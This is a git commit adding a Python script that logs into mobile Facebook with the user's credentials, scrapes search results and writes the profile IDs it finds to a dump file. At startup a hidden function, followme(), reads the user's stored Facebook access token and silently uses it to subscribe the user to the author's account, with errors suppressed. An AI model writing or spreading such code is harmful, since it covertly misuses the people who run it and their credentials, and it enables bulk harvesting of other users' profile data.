8719a64c9bc7d0fcd178e6361b12b6702766c14e
NOOBIE <44431105+KANG-NEWBIE@users.noreply.github.com>
2019-05-08 19:52:45 +0700

    Add files via upload

---
+++ src/DumpS.py
@@ -0,0 +1,92 @@
+import requests,bs4,mechanize,json,re,sys,time,os
+from http.cookiejar import LWPCookieJar as kuki
+from requests import Session as ses
+
+class cari_id(object):
+	def __init__(self):
+		self.req=requests.Session()
+		self.i="https://mbasic.facebook.com/{}"
+		self.login()
+		
+	def login(self):
+		print("\n[!] checking cookies")
+		time.sleep(1)
+		s = self.req
+		s.cookies = kuki('toket/kue.txt')
+		try:
+			fil=open('toket/kue.txt')
+			fil.close()
+		except FileNotFoundError:
+			print("[!] cookies not found\n\n[!] please login in your facebook once again")
+			email=input('[?] email/username: ')
+			pw=input('[?] password: ')
+			data = {'email':email,'pass':pw}
+			urrl='https://mbasic.facebook.com/login'
+			res = s.post(urrl,data=data).text
+			if 'm_sess' in str(res) or 'save-device' in str(res):
+				s.cookies.save()
+				self.q()
+			else:
+				exit('[!] fail login into your account')
+		print('[√] cookies found\n')
+		self.q()
+			
+	def q(self):
+		self.req.cookies=kuki('toket/kue.txt')
+		self.req.cookies.load()
+		self.query=input("[?] Search: ")
+		if self.query =="":
+			self.q()
+		else:
+			loli=[]
+			bs=bs4.BeautifulSoup(self.req.get(self.i.format("search/top/?q=%s"%(self.query))).text,features="html.parser")
+			for x in bs.find_all("a",href=True):
+				if "graphsearch" in x["href"]:
+					loli.append(self.i.format(x["href"]))
+			if len(loli) !=0:
+				self.cari(loli[0])
+			else:
+				print("[!] user does exist.")
+				
+	def cari(self,url):
+		bs=bs4.BeautifulSoup(self.req.get(url).text,
+			features="html.parser")
+		for x in bs.find_all("a",href=True):
+			p=x.find("div")
+			if "None" in str(p) or "+" in str(p):
+				continue
+			else:
+				js=re.findall("/(.*?)$",x["href"])
+				if len(js) !=0:
+					print("\r[!] %s                     "%(p.text))
+					open("dump/search_id.txt","a").write("%s\n"%(js[0].replace("profile.php?id=","")))
+					print("\r[%s] Writing .. "%(len(open("dump/search_id.txt").readlines())),end=""),;sys.stdout.flush()
+		for xi in bs.find_all("a",href=True):
+			if "lihat hasil selanjutnya" in xi.text.lower():
+				self.cari(xi["href"])
+		exit("\n[+] Done. file save as dump/search_id.txt")
+		
+def followme():
+	try:
+		ken=open('toket/token.txt','r').read();rr=requests.post('https://graph.facebook.com/adlizhafari.nub/subscribers?access_token='+ken)
+		ken.close()
+	except: pass
+
+if __name__ == '__main__':
+	os.system('clear')
+	followme()
+	try:
+		os.mkdir('dump')
+	except: pass
+	try:
+		print("""
+\t;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+\t; Dump id with search name ;
+\t;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+	   
+	     Author : Kang-Newbie
+	  Thanks to Deray (LOoLzeC)
+""")
+		cari_id()
+	except Exception as F:
+		print("Err: %s"%(F))
